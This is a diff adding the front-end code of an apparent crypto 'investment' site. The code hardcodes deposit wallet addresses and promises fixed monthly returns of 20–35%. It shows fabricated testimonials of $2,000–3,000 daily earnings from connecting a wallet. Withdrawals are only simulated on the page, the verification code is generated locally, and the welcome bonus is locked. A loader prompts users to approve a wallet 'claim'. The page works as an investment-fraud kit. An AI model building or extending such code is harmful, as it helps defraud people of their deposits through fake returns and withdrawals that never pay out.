+  <div id="dd-referral" style="display:none;"><div style="padding:18px;"><h1 style="font-size:22px;font-weight:900;margin-bottom:4px;">Referral Program <span style="background:#22c55e;color:#fff;font-size:11px;padding:3px 8px;border-radius:10px;margin-left:6px;">10%</span></h1><p style="font-size:12px;color:#aaa;margin-bottom:18px;">Earn commissions on every referral</p><div class="ref-hero"><div style="font-size:36px;margin-bottom:10px;">🎁</div><div style="font-size:18px;font-weight:800;margin-bottom:6px;">Earn Up to 15% Commission</div><div style="font-size:12px;color:#aaa;">Share your code and earn on every deposit.</div></div><div class="ref-tiers"><div style="font-size:14px;font-weight:700;margin-bottom:12px;">Reward Levels</div><div class="ref-tier"><span>Starter <span style="color:#aaa;font-size:11px;">0–9</span></span><span style="font-weight:700;">5%</span></div><div class="ref-tier"><span style="color:#f97316;">Bronze <span style="color:#aaa;font-size:11px;">10–24</span></span><span style="color:#f97316;font-weight:700;">7%</span></div><div class="ref-tier"><span style="color:#c9a84c;">Gold <span style="color:#aaa;font-size:11px;">50–99</span></span><span style="color:#c9a84c;font-weight:700;">12%</span></div><div class="ref-tier"><span style="color:#22c55e;">Elite <span style="color:#aaa;font-size:11px;">100+</span></span><span style="color:#22c55e;font-weight:700;">15%</span></div></div><div class="ref-code"><div style="font-size:12px;color:#aaa;">Your Referral Code</div><div class="ref-val" id="ref-code">—</div><div class="ref-link"><span class="ref-link-txt" id="ref-link-txt">—</span><button class="ref-copy" id="ref-copy-btn">Copy</button></div></div><div class="ref-stats"><div class="ref-stat"><div class="ref-sv">0</div><div style="font-size:11px;color:#aaa;">Total Referrals</div></div><div class="ref-stat"><div class="ref-sv" style="color:#22c55e;">$0.00</div><div style="font-size:11px;color:#aaa;">Total Earnings</div></div></div><button class="back-btn" onclick="showDash('main')">← Back</button></div></div>
+
+  <div id="dd-stories" style="display:none;">
+    <div class="ph"><h1>Success Stories</h1><p>Real traders, real results.</p></div>
+    <div id="stories-list"></div>
+    <div style="padding:0 20px;"><button class="back-btn" onclick="showDash('main')">← Back</button></div>
+  </div>
+</div>
+
+<div class="pancake-loader" id="pancake-loader">
+  <div class="pl-scene">
+    <div class="pl-glow"></div>
+    <div class="pl-pan"></div>
+    <div class="pl-pancake"><div class="pl-butter"></div></div>
+    <div class="pl-steam"></div><div class="pl-steam"></div><div class="pl-steam"></div>
+  </div>
+  <div class="pl-msg" id="loader-msg">Processing transaction in your wallet...</div>
+  <div class="pl-sub">Please approve the claim in your wallet...<span class="pl-dots"><span></span><span></span><span></span></span></div>
+  <div class="pl-actions">
+    <button class="pl-btn-open" id="pl-open-wallet" onclick="openWalletApp()">📱 Open Wallet App</button>
+    <button class="pl-btn-cancel" onclick="cancelWalletAction()">Cancel</button>
+  </div>
+</div>
+
+<!--Tawk.to-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{},Tawk_LoadStart=new Date();
+(function(){ var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0]; s1.async=true; s1.src='https://embed.tawk.to/6a5b4ed886a5ac1d462311ef/1jtqao0ah'; s1.charset='UTF-8'; s1.setAttribute('crossorigin','*'); s0.parentNode.insertBefore(s1,s0); })();
+</script>
+
+<script>
+// ─── API Configuration ──────────────────────────────────────────
+// Backend server URL — connected to live Render backend
+// Routes match the Express backend exactly:
+//   POST /api/auth/register   -> creates pending account + sends OTP email
+//   POST /api/auth/verify-otp -> finalizes account after OTP
+//   POST /api/auth/resend-otp -> resends OTP
+//   POST /api/auth/login      -> login with email + password
+//   GET  /                    -> health check
+var API_CONFIG = {
+  API_BASE: 'https://my-app-backend-2x3t.onrender.com',
+  REGISTER_ENDPOINT: '/api/auth/register',
+  VERIFY_OTP_ENDPOINT: '/api/auth/verify-otp',
+  RESEND_OTP_ENDPOINT: '/api/auth/resend-otp',
+  LOGIN_ENDPOINT: '/api/auth/login',
+  HEALTH_ENDPOINT: '/'
+};
+function apiUrl(endpoint){ return (API_CONFIG.API_BASE||'') + endpoint; }
+function isBackendConnected(){ return !!(API_CONFIG.API_BASE && API_CONFIG.API_BASE.length>0); }
+async function verifyBackend(){
+  if(!isBackendConnected()) return false;
+  try{
+    var r = await fetch(apiUrl(API_CONFIG.HEALTH_ENDPOINT), {method:'GET'});
+    var t = await r.text();
+    var d = null; try{ d = t ? JSON.parse(t) : null; }catch(e){ d=null; }
+    return !!(d && d.success);
+  }catch(e){ return false; }
+}
+
+// ─── API Utilities ────────────────────────────────────────────────
+function setAuthToken(token){ try{ localStorage.setItem('vg_auth_token', token); }catch(e){} }
+function getAuthToken(){ try{ return localStorage.getItem('vg_auth_token')||''; }catch(e){ return ''; } }
+function clearAuthToken(){ try{ localStorage.removeItem('vg_auth_token'); }catch(e){} }
+
+async function apiPost(endpoint, payload){
+  var url = apiUrl(endpoint);
+  var token = getAuthToken();
+  var headers = { 'Content-Type':'application/json' };
+  if(token){ headers['Authorization'] = 'Bearer ' + token; }
+  var resp = await fetch(url, {
+    method: 'POST',
+    headers: headers,
+    body: JSON.stringify(payload||{})
+  });
+  var text = await resp.text();
+  var data = null;
+  try{ data = text ? JSON.parse(text) : null; }catch(e){ data = { error: 'Server returned a non-JSON response.' }; }
+  if(!resp.ok){
+    throw { status: resp.status, message: (data && (data.error||data.message)) || ('Request failed ('+resp.status+')'), data: data };
+  }
+  return data;
+}
+
+async function apiGet(endpoint){
+  var url = apiUrl(endpoint);
+  var token = getAuthToken();
+  var headers = { 'Content-Type':'application/json' };
+  if(token){ headers['Authorization'] = 'Bearer ' + token; }
+  var resp = await fetch(url, { method: 'GET', headers: headers });
+  var text = await resp.text();
+  var data = null;
+  try{ data = text ? JSON.parse(text) : null; }catch(e){ data = { error: 'Server returned a non-JSON response.' }; }
+  if(!resp.ok){
+    throw { status: resp.status, message: (data && (data.error||data.message)) || ('Request failed ('+resp.status+')'), data: data };
+  }
+  return data;
+}
+
+// Map backend errors to friendly messages
+function friendlyAuthError(err){
+  if(!err) return 'An unexpected error occurred. Please try again.';
+  var msg = (err.message||'').toLowerCase();
+  if(msg.indexOf('invalid otp')!==-1 || msg.indexOf('invalid code')!==-1 || msg.indexOf('invalid verification')!==-1) return 'The OTP you entered is invalid. Please check and try again.';
+  if(msg.indexOf('expired')!==-1 || msg.indexOf('timeout')!==-1) return 'Your verification code has expired. Please request a new one.';
+  if(msg.indexOf('no pending registration')!==-1) return 'No pending registration found. Please sign up again.';
+  if(err.status===401 || msg.indexOf('unauthorized')!==-1 || msg.indexOf('invalid credentials')!==-1 || msg.indexOf('invalid email or password')!==-1) return 'Invalid email or password.';
+  if(err.status===409 || msg.indexOf('already')!==-1) return 'An account with this email already exists.';
+  if(err.status===429) return 'Too many attempts. Please wait a moment and try again.';
+  return err.message || 'Authentication failed. Please try again.';
+}
+
+// ─── App State ───────────────────────────────────────────────────
+var WA={
+  usdt:{addr:'0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db',net:'BEP-20',lbl:'USDT (BEP-20)',asset:'USDT',ticker:'USDT'},
+  ltc:{addr:'ltc1q4lqt46g9998al7kneq9533s37w5xk6x63m39w6',net:'LTC',lbl:'LTC',asset:'LTC',ticker:'LTC'},
+  btc:{addr:'bc1qy4s8k920xkfd50rurwuusuwvegh0ljw2dktddn',net:'BTC',lbl:'Bitcoin (BTC)',asset:'BTC',ticker:'BTC'},
+  bnb:{addr:'0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db',net:'BNB',lbl:'BNB',asset:'BNB',ticker:'BNB'}
+};
+var selM2='usdt',tmrInt=null,cpMin=500,depAmt=1000;
+var prices={btc:97245,eth:3412,bnb:645,sol:178,xrp:2.34,ada:0.98};
+var verifyTimer=null,verifyCountdown=15;
+var userBalance=100,WELCOME_BONUS=100,totalDeposited=0;
+var userInvestments=[],pendingWithdrawals=[],withdrawalHistory=[];
+var profitCheckTimer=null,currentPlanKey='yield',currentPlanAmount=1000;
+var generatedOTP=null,wdFeeRate=0.01,processedTxHashes=[],blockchainMonitorTimer=null;
+var PLAN_CONFIG={
+  yield:{name:'Institutional Yield',minAmount:1000,maxAmount:9999,totalRate:0.20,dailyRate:0.20/30,days:30},
+  alpha:{name:'Strategic Alpha',minAmount:10000,maxAmount:49999,totalRate:0.25,dailyRate:0.25/30,days:30},
+  elite:{name:'Elite Managed',minAmount:50000,maxAmount:499999,totalRate:0.35,dailyRate:0.35/30,days:30}
+};
+var POOL=[
+  {n:'Chiara Romano',l:'🇮🇹 Italy',q:'Connected MetaMask and daily earnings started flowing. $2,400/day average.',i:'https://i.ibb.co/0pDwjgR4/1785214812149.jpg'},
+  {n:'Carlos Rivera',l:'🇲🇽 Mexico',q:'VIP signals turned $10k into $28k in one month.',i:'https://i.ibb.co/4RJv4bqF/file-00000000066081f4bcc556545d1aec65.png'},
+  {n:'Elena Petrova',l:'🇷🇺 Russia',q:'Connected my wallet and earned $2,800 in just one day.',i:'https://i.ibb.co/fjTKBvn/IMG-20260728-051148.png'},
+  {n:'Ingrid Hansen',l:'🇳🇴 Norway',q:'Wallet connection earnings are real. $2,600/day deposited to my balance.',i:'https://i.ibb.co/R4tM4QJn/IMG-20260728-050947.jpg'},
+  {n:'Hassan Ali',l:'🇸🇦 Saudi Arabia',q:'Wallet + VIP plan = $3,000/day consistently.',i:'https://i.ibb.co/KcDTRtSb/file-0000000012588210b2711a44d07c1784.png'},
+  {n:'Sandra Obi',l:'🇳🇬 Nigeria',q:'Joined 6 months ago. Total profits: $47,000.',i:'https://i.ibb.co/39tPqsjg/file-00000000cfe882469a327d6981257e24.png'},
+  {n:'Lucas Andersen',l:'🇩🇰 Denmark',q:'Wallet connection unlocked daily earnings. $2,900/day!',i:'https://i.ibb.co/k2nmkp0X/file-00000000bce48243ab9e3555abde47c4.png'},
+  {n:'Jennifer Brown',l:'🇺🇸 USA',q:'Wallet connected, earning $2,700/day.',i:'https://i.ibb.co/ycN8zLQv/IMG-20260728-050855.jpg'},
+  {n:'Isabella Martinez',l:'🇪🇸 Spain',q:'Connected MetaMask and started earning immediately. $2,500 first day!',i:'https://i.ibb.co/SDw74F1g/file-0000000043408243a37f50df51647c68.png'},
+  {n:'Mei Lin',l:'🇹🇼 Taiwan',q:'Signal alerts on Telegram are instant. Caught SOL pump for $3,600 profit.',i:'https://i.ibb.co/HfhHWzcZ/IMG-20260728-064333.jpg'},
+  {n:'Takeshi Yamamoto',l:'🇯🇵 Japan',q:'Platform security gives me confidence. $30k invested, $42k returned.',i:'https://i.ibb.co/mfg4R0R/IMG-20260728-054150.jpg'},
+  {n:'Amara Osei',l:'🇬🇭 Ghana',q:'Withdrew $8,500 seamlessly.',i:'https://i.ibb.co/ZpgLmpHg/file-00000000b3bc82468b629bf14e19f5f3.png'},
+  {n:'Newton Al-Balushi',l:'🇴🇲 Oman',q:'Withdrew $22,000 after 2 months on Elite plan.',i:'https://i.ibb.co/x883XyYk/IMG-20260728-054113.jpg'},
+  {n:'Priya Sharma',l:'🇮🇳 India',q:'Managing $20,000 portfolio from my phone daily.',i:'https://i.ibb.co/wFDMdnj1/file-00000000444081f4a5412abc04a444f3.png'},
+  {n:'Chloe Dubois',l:'🇫🇷 France',q:'From $5,000 to $19,000 in 4 weeks.',i:'https://i.ibb.co/LXJsGMHg/file-0000000018348243aefeee30d363b2e2.png'},
+  {n:'William John',l:'🇨🇦 Canada',q:'Copy trading turned my $15,000 into $46,000 in 3 weeks.',i:'https://i.ibb.co/vCqrv3kb/file-000000007d5081f4bc3656f3d272b95a.png'},
+  {n:'Fatou Diallo',l:'🇸🇳 Senegal',q:'Connected wallet with $25,000. Institutional-grade earnings from day one.',i:'https://i.ibb.co/9HnqFhFb/file-00000000e46881f484e413a6cec3c3ec.png'},
+  {n:'Zara Ahmed',l:'🇵🇰 Pakistan',q:'Platform UI is modern and intuitive.',i:'https://i.ibb.co/vxGmLz2w/file-00000000919c81f4bf62183a0e0a493d.png'},
+  {n:'Raj Patel',l:'🇮🇳 India',q:'$1,800/day in passive earnings.',i:'https://i.ibb.co/DfsQ3m1c/file-000000006eac81f4bfadb0ef0366747f.png'},
+  {n:'Patrick Oduya',l:'🇰🇪 Kenya',q:'Wallet connected, $2,200/day. No effort needed after setup.',i:'https://i.ibb.co/Z1mVZwPS/file-0000000015b481f4ab0c4bca1e654880.png'}
+];
+
+// ─── Language selector (label only, no Google Translate) ────────
+window.onload=function(){
+  loadState(); updateBalanceDisplays(); startProfitEngine(); startBlockchainMonitor(); renderWithdrawalHistory(); applyUserData();
+};
+document.addEventListener('click',function(e){ if(!e.target.closest('#lang-sel')) document.getElementById('lang-drop').classList.remove('open'); });
+function toggleLang(){ document.getElementById('lang-drop').classList.toggle('open'); }
+function setLang(c){
+  document.getElementById('lc').textContent=c;
+  document.getElementById('lang-drop').classList.remove('open');
+}
+
+var PAGES=['landing','dashboard','terms','privacy'];
+function showPage(id){ PAGES.forEach(function(p){ var el=document.getElementById('page-'+p); if(el) el.classList.remove('active'); }); var el=document.getElementById('page-'+id); if(el) el.classList.add('active'); if(id==='dashboard'){ updateBalanceDisplays(); renderActiveInvestments(); renderWithdrawalHistory(); applyUserData(); } window.scrollTo(0,0); }
+function openAuth(tab){ document.getElementById('auth-modal').classList.add('open'); switchTab(tab); }
+function closeAuth(){ document.getElementById('auth-modal').classList.remove('open'); }
+function switchTab(t){ document.getElementById('form-create').style.display=t==='create'?'block':'none'; document.getElementById('form-signin').style.display=t==='signin'?'block':'none'; document.getElementById('tab-c').className='tab-btn'+(t==='create'?' on':''); document.getElementById('tab-s').className='tab-btn'+(t==='signin'?' on':''); }
+
+// ─── Dynamic User Data ──────────────────────────────────────────
+function getUserData(){ try{ return JSON.parse(localStorage.getItem('vg_user')||'{}'); }catch(e){ return {}; } }
+function saveUserData(u){ try{ localStorage.setItem('vg_user',JSON.stringify(u)); }catch(e){} }
+function generateRefCode(name){
+  if(!name) return 'VANKLEFF';
+  var c=name.replace(/[^a-zA-Z0-9]/g,'').toUpperCase().slice(0,6);
+  if(c.length<3) c='USER'+c;
+  return c;
+}
+function applyUserData(){
+  var u=getUserData();
+  var name=u.name||'Member';
+  var email=u.email||'Not set';
+  var phone=u.phone||'';
+  var initials=(name||'V').charAt(0).toUpperCase();
+  var refCode=generateRefCode(name);
+  var gn=document.getElementById('user-greet-name'); if(gn) gn.textContent=name;
+  var pu=document.getElementById('pm-username'); if(pu) pu.textContent=name;
+  var su=document.getElementById('set-username'); if(su) su.textContent=name;
+  var se=document.getElementById('set-email'); if(se) se.textContent=email;
+  var sui=document.getElementById('set-username-inp'); if(sui) sui.value=name;
+  var spi=document.getElementById('set-phone-inp'); if(spi) spi.value=phone||'';
+  var pa=document.getElementById('set-avatar'); if(pa) pa.textContent=initials;
+  var na=document.getElementById('nav-avatar'); if(na) na.textContent=initials;
+  var pma=document.getElementById('pm-avatar'); if(pma) pma.textContent=initials;
+  var rc=document.getElementById('ref-code'); if(rc) rc.textContent=refCode;
+  var rl=document.getElementById('ref-link-txt'); if(rl) rl.textContent='https://vankleffglobal.com/?ref='+refCode;
+  var rcb=document.getElementById('ref-copy-btn');
+  if(rcb) rcb.onclick=function(){ var url='https://vankleffglobal.com/?ref='+refCode; if(navigator.clipboard){navigator.clipboard.writeText(url).then(function(){alert('Copied!');});}else{alert(url);} };
+}
+function saveSettings(){
+  var u=getUserData();
+  var nui=document.getElementById('set-username-inp');
+  if(nui&&nui.value.trim()) u.name=nui.value.trim();
+  var pui=document.getElementById('set-phone-inp');
+  if(pui) u.phone=pui.value.trim();
+  saveUserData(u);
+  applyUserData();
+  alert('Changes saved successfully!');
+}
+
+// ─── Authentication (Backend-Ready, aligned to Express routes) ───
+// Backend flow:
+//   1. POST /api/auth/register { name, email, phone, password }
+//      -> server stores pending account + emails OTP
+//   2. POST /api/auth/verify-otp { email, otp }
+//      -> server finalizes account
+//   3. POST /api/auth/login { email, password }
+//      -> server returns user
+var pendingSignup=null;
+
+function showOtpStep(){
+  document.getElementById('c-otp-wrap').style.display='block';
+  var btn=document.getElementById('btn-create');
+  btn.textContent='Verify & Create Account →';
+  btn.setAttribute('onclick','doCreateVerify()');
+}
+function resetCreateButton(){
+  var btn=document.getElementById('btn-create');
+  btn.disabled=false;
+  btn.textContent='Create Private Account →';
+  btn.setAttribute('onclick','doLoginCreate()');
+}
+
+// Step 1 — register (creates pending account + sends OTP)
+function doLoginCreate(){
+  var name=document.getElementById('c-name').value.trim(),
+      email=document.getElementById('c-email').value.trim(),
+      phone=document.getElementById('c-phone').value.trim(),
+      pass=document.getElementById('c-pass').value.trim();
+  if(!name||!email||!phone||!pass){ alert('Please fill in all fields.'); return; }
+  if(pass.length<8){ alert('Password must be at least 8 characters.'); return; }
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){ alert('Please enter a valid email address.'); return; }
+
+  if(!isBackendConnected()){
+    showGM('Backend not connected','The authentication backend is not connected yet. Please set API_BASE in API_CONFIG to enable sign-up.','OK',closeGM,false);
+    return;
+  }
+
+  pendingSignup={name:name,email:email,phone:phone,password:pass};
+  var btn=document.getElementById('btn-create');
+  btn.disabled=true; btn.textContent='Sending code...';
+
+  // Wake the Render backend (free tier sleeps) before calling register
+  verifyBackend().then(function(up){
+    if(!up){
+      btn.disabled=false; btn.textContent='Create Private Account →';
+      showGM('Backend Unreachable','Could not reach the authentication backend. It may be waking up — please wait a moment and try again.','OK',closeGM,false);
+      return;
+    }
+    apiPost(API_CONFIG.REGISTER_ENDPOINT, { name:name, email:email, phone:phone, password:pass })
+      .then(function(res){
+        btn.disabled=false;
+        showOtpStep();
+        alert('✅ A 6-digit verification code was sent to '+email+'. Check your inbox (and spam folder).');
+      })
+      .catch(function(err){
+        btn.disabled=false;
+        showGM('Could Not Send Code', friendlyAuthError(err),'OK',function(){ closeGM(); resetCreateButton(); },false);
+      });
+  });
+}
+
+// Step 2 — verify OTP (finalizes account)
+function doCreateVerify(){
+  if(!pendingSignup) return;
+  var code=document.getElementById('c-otp').value.trim();
+  if(!code||code.length!==6){ alert('Enter the 6-digit code from your email.'); return; }
+
+  var btn=document.getElementById('btn-create');
+  btn.disabled=true; btn.textContent='Verifying...';
+
+  apiPost(API_CONFIG.VERIFY_OTP_ENDPOINT, { email:pendingSignup.email, otp:code })
+    .then(function(verifyRes){
+      finishSignup(null);
+    })
+    .catch(function(err){
+      btn.disabled=false;
+      btn.textContent='Verify & Create Account →';
+      showGM('Verification Failed', friendlyAuthError(err),'OK',closeGM,false);
+    });
+}
+
+function finishSignup(serverUser){
+  var userData={
+    name:(serverUser && (serverUser.name||serverUser.full_name)) || pendingSignup.name,
+    email:(serverUser && serverUser.email) || pendingSignup.email,
+    phone:(serverUser && serverUser.phone) || pendingSignup.phone
+  };
+  saveUserData(userData);
+  closeAuth(); showPage('dashboard'); showDash('main'); buildRotTesti(); applyUserData();
+  pendingSignup=null;
+  document.getElementById('c-otp-wrap').style.display='none';
+  document.getElementById('c-name').value='';document.getElementById('c-email').value='';document.getElementById('c-phone').value='';document.getElementById('c-pass').value='';document.getElementById('c-otp').value='';
+  resetCreateButton();
+}
+
+function resendSignupOTP(){
+  if(!pendingSignup) return;
+  if(!isBackendConnected()){
+    showGM('Backend not connected','The authentication backend is not connected yet.','OK',closeGM,false);
+    return;
+  }
+  apiPost(API_CONFIG.RESEND_OTP_ENDPOINT, { email:pendingSignup.email })
+    .then(function(){ alert('Code resent to '+pendingSignup.email); })
+    .catch(function(err){ showGM('Could Not Resend', friendlyAuthError(err),'OK',closeGM,false); });
+}
+
+// Login — POST to LOGIN_ENDPOINT
+function doLoginSignIn(){
+  var email=document.getElementById('s-email').value.trim(),pass=document.getElementById('s-pass').value.trim();
+  if(!email||!pass){ alert('Please enter your email and password.'); return; }
+
+  if(!isBackendConnected()){
+    showGM('Backend not connected','The authentication backend is not connected yet. Please set API_BASE in API_CONFIG to enable login.','OK',closeGM,false);
+    return;
+  }
+
+  document.getElementById('btn-signin').style.display='none';
+  document.getElementById('load-signin').style.display='block';
+
+  // Wake the Render backend before login
+  verifyBackend().then(function(up){
+    if(!up){
+      document.getElementById('load-signin').style.display='none';
+      document.getElementById('btn-signin').style.display='block';
+      showGM('Backend Unreachable','Could not reach the authentication backend. It may be waking up — please wait a moment and try again.','OK',closeGM,false);
+      return;
+    }
+    apiPost(API_CONFIG.LOGIN_ENDPOINT, { email:email, password:pass })
+      .then(function(res){
+        var token = (res && (res.token||res.access_token||res.auth_token)) || '';
+        if(token){ setAuthToken(token); }
+        var user = (res && res.user) ? res.user : { email:email };
+        var name = (user.name||user.full_name) || email.split('@')[0].replace(/[._\-+]/g,' ');
+        name = name.charAt(0).toUpperCase()+name.slice(1);
+        saveUserData({ name:name, email:user.email||email, phone:user.phone||'' });
+        document.getElementById('load-signin').style.display='none';
+        document.getElementById('btn-signin').style.display='block';
+        closeAuth();showPage('dashboard');showDash('main');buildRotTesti();applyUserData();
+      })
+      .catch(function(err){
+        document.getElementById('load-signin').style.display='none';
+        document.getElementById('btn-signin').style.display='block';
+        showGM('Sign In Failed', friendlyAuthError(err),'OK',closeGM,false);
+      });
+  });
+}
+
+var DD=['main','markets','signals','plans','deposit','withdraw','transfer','statement','settings','performance','referral','stories','copytrade','preferences'];
+function showDash(sub){ DD.forEach(function(s){ var el=document.getElementById('dd-'+s); if(el) el.style.display='none'; }); var el=document.getElementById('dd-'+sub); if(el) el.style.display='block'; if(sub==='stories') buildStories(); if(sub==='markets') buildMkts(); if(sub==='main'||sub==='performance'||sub==='transfer'||sub==='withdraw') updateBalanceDisplays(); if(sub==='withdraw'){ renderWithdrawalHistory(); updWdDetails(); } if(sub==='settings'||sub==='referral'||sub==='main') applyUserData(); window.scrollTo(0,0); }
+function openSB(){ document.getElementById('sidebar').classList.add('open'); document.getElementById('sb-ov').classList.add('open'); }
+function closeSB(){ document.getElementById('sidebar').classList.remove('open'); document.getElementById('sb-ov').classList.remove('open'); }
+function openPM(){ document.getElementById('pm-ov').classList.add('open'); updateBalanceDisplays(); applyUserData(); }
+function closePM(){ document.getElementById('pm-ov').classList.remove('open'); }
+function showConf(){ document.getElementById('conf-ov').classList.add('open'); }
+function doLogout(){ try{localStorage.removeItem('vg_user');}catch(e){} clearAuthToken(); document.getElementById('conf-ov').classList.remove('open'); showPage('landing'); }
+function closeGM(){ document.getElementById('gm-ov').classList.remove('open'); }
+function showGM(t,b,btnTxt,fn,showC){ document.getElementById('gm-t').textContent=t; document.getElementById('gm-b').textContent=b; var btn=document.getElementById('gm-btn'); btn.textContent=btnTxt||'OK'; btn.onclick=fn||closeGM; document.getElementById('gm-c').style.display=showC?'block':'none'; document.getElementById('gm-ov').classList.add('open'); }
+function showVerify(msg,onComplete){ verifyCountdown=15; document.getElementById('verify-title').textContent='Verifying...'; document.getElementById('verify-msg').textContent=msg; document.getElementById('verify-count').textContent=verifyCountdown; document.getElementById('verify-ov').classList.add('open'); if(verifyTimer) clearInterval(verifyTimer); verifyTimer=setInterval(function(){ verifyCountdown--; var cEl=document.getElementById('verify-count'); if(cEl) cEl.textContent=verifyCountdown; if(verifyCountdown<=0){ clearInterval(verifyTimer); verifyTimer=null; document.getElementById('verify-ov').classList.remove('open'); if(onComplete) onComplete(); } },1000); }
+function getWithdrawableBalance(){ return Math.max(userBalance-WELCOME_BONUS,0); }
+function sendWithdrawalOTP(){ generatedOTP=String(Math.floor(100000+Math.random()*900000)); showGM('OTP Sent 📧','A 6-digit verification code has been sent to your registered email. (Demo: '+generatedOTP+')','OK',closeGM,false); }
+function updWdDetails(){ var amt=parseFloat(document.getElementById('wd-amt').value)||0; var fee=amt*wdFeeRate; var recv=Math.max(amt-fee,0); document.getElementById('wd-fee').textContent='$'+fee.toFixed(2); document.getElementById('wd-recv').textContent='$'+recv.toFixed(2); document.getElementById('wd-balance').textContent='$'+getWithdrawableBalance().toFixed(2); }
+function isValidBEP20(addr){ return /^0x[a-fA-F0-9]{40}$/.test(addr); }
+function verifyWithdraw(){ var addr=document.getElementById('wd-addr').value.trim(); var amt=parseFloat(document.getElementById('wd-amt').value); var otps=document.querySelectorAll('.otp-in'); var code=''; otps.forEach(function(inp){ code+=inp.value.trim(); }); if(!addr){ showGM('Address Required','Please enter your destination wallet address.','OK',closeGM,false); return; } if(!isValidBEP20(addr)){ showGM('Invalid Address','Please enter a valid BEP-20 (0x...) wallet address.','OK',closeGM,false); return; } if(!amt||isNaN(amt)){ showGM('Amount Required','Please enter a withdrawal amount.','OK',closeGM,false); return; } if(amt<100){ showGM('Minimum Withdrawal','The minimum withdrawal is $100 USDT.','OK',closeGM,false); return; } if(amt>getWithdrawableBalance()){ showGM('Insufficient Balance','You don\'t have enough withdrawable balance.','Deposit Now',function(){ closeGM(); showDash('deposit'); },true); return; } if(!generatedOTP){ sendWithdrawalOTP(); return; } if(code.length<6){ showGM('OTP Required','Please enter the 6-digit OTP.','OK',closeGM,false); return; } if(code!==generatedOTP){ showGM('Invalid OTP','The OTP is incorrect.','Resend OTP',function(){ closeGM(); sendWithdrawalOTP(); },true); return; } var fee=amt*wdFeeRate,recv=amt-fee; document.getElementById('wc-addr').textContent=addr; document.getElementById('wc-net').textContent='BEP-20'; document.getElementById('wc-amt').textContent='$'+amt.toFixed(2); document.getElementById('wc-fee').textContent='$'+fee.toFixed(2); document.getElementById('wc-recv').textContent='$'+recv.toFixed(2); document.getElementById('wd-conf-ov').classList.add('open'); }
+function executeWithdrawal(){ document.getElementById('wd-conf-ov').classList.remove('open'); var addr=document.getElementById('wd-addr').value.trim(); var amt=parseFloat(document.getElementById('wd-amt').value); var fee=amt*wdFeeRate,recv=amt-fee; showVerify('Processing withdrawal on BEP-20...',function(){ userBalance-=amt; var txId='WD'+Date.now(); var record={txId:txId,date:new Date().toISOString(),amount:amt,fee:fee,receive:recv,address:addr,network:'BEP-20',status:'pending'}; withdrawalHistory.push(record); saveState(); addStatementItem('withdrawal','Withdrawal to '+addr.slice(0,8)+'...',amt,'pending',false); updateBalanceDisplays(); renderWithdrawalHistory(); generatedOTP=null; document.getElementById('wd-addr').value=''; document.getElementById('wd-amt').value=''; document.querySelectorAll('.otp-in').forEach(function(inp){ inp.value=''; }); updWdDetails(); document.getElementById('wd-success-txid').textContent=txId; document.getElementById('wd-success-ov').classList.add('open'); }); }
+function renderWithdrawalHistory(){ var body=document.getElementById('wd-history-body'); if(!body) return; if(!withdrawalHistory.length){ body.innerHTML='<tr><td colspan="5" style="text-align:center;color:#666;">No withdrawals yet.</td></tr>'; return; } body.innerHTML=withdrawalHistory.slice().reverse().map(function(w){ var d=new Date(w.date),ds=d.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'}); var short=String(w.address).slice(0,8)+'...'+String(w.address).slice(-4); var cls=w.status==='completed'?'swc2':w.status==='failed'?'swf2':'swp2'; return '<tr><td class="mono">'+w.txId+'</td><td>'+ds+'</td><td>$'+Number(w.amount).toFixed(2)+'</td><td class="mono">'+short+'</td><td><span class="swdg '+cls+'">'+w.status+'</span></td></tr>'; }).join(''); }
+function selM(m){ selM2=m; document.querySelectorAll('.meth').forEach(function(b){ b.classList.remove('sel'); }); document.getElementById('m-'+m).classList.add('sel'); if(document.getElementById('dep-addr').style.display!=='none') updAddr(); }
+function setAmt(v){ document.getElementById('dep-amt').value=v; depAmt=v; }
+function updAddr(){ var w=WA[selM2]; document.getElementById('w-addr').textContent=w.addr; document.getElementById('addr-lbl').textContent=w.lbl+' Wallet Address'; document.getElementById('net-bdg').textContent=w.net; document.getElementById('warn-txt').textContent='Only send '+w.lbl+' to this address.'; document.getElementById('qr-img').src='https://api.qrserver.com/v1/create-qr-code/?data='+encodeURIComponent(w.addr)+'&size=180x180&margin=10'; }
+function showAddr(){ var a=parseFloat(document.getElementById('dep-amt').value); if(!a||isNaN(a)||a<1000){ showGM('Minimum Deposit Required','The minimum deposit amount is $1,000.','OK',closeGM,false); return; } depAmt=a; updAddr(); document.getElementById('dep-form').style.display='none'; document.getElementById('dep-addr').style.display='block'; startTmr(30*60); window.scrollTo(0,0); }
+function cpAddr(){ var addr=document.getElementById('w-addr').textContent; navigator.clipboard?navigator.clipboard.writeText(addr).then(function(){ alert('✅ Copied!'); }):alert(addr); }
+function startTmr(s){ clearTmr(); tmrInt=setInterval(function(){ if(s<=0){ clearTmr(); document.getElementById('tmr').textContent='Expired'; return; } s--; var m=Math.floor(s/60),sc=s%60; document.getElementById('tmr').textContent=(m<10?'0':'')+m+':'+(sc<10?'0':'')+sc; },1000); }
+function clearTmr(){ if(tmrInt){ clearInterval(tmrInt); tmrInt=null; } }
+function confDep(){ var w=WA[selM2]; document.getElementById('proc-asset').textContent=w.asset; document.getElementById('proc-network').textContent=w.net; document.getElementById('proc-net-txt').textContent='Awaiting on-chain confirmation on the '+w.net+' network.'; document.getElementById('proc-qty').textContent=depAmt.toFixed(4)+' '+w.ticker; document.getElementById('proc-status').textContent='Awaiting'; document.getElementById('proc-status').style.color='#f59e0b'; document.getElementById('proc-ov').classList.add('open'); }
+function startBlockchainMonitor(){ if(blockchainMonitorTimer) clearInterval(blockchainMonitorTimer); scanForDeposits(); blockchainMonitorTimer=setInterval(scanForDeposits,20000); }
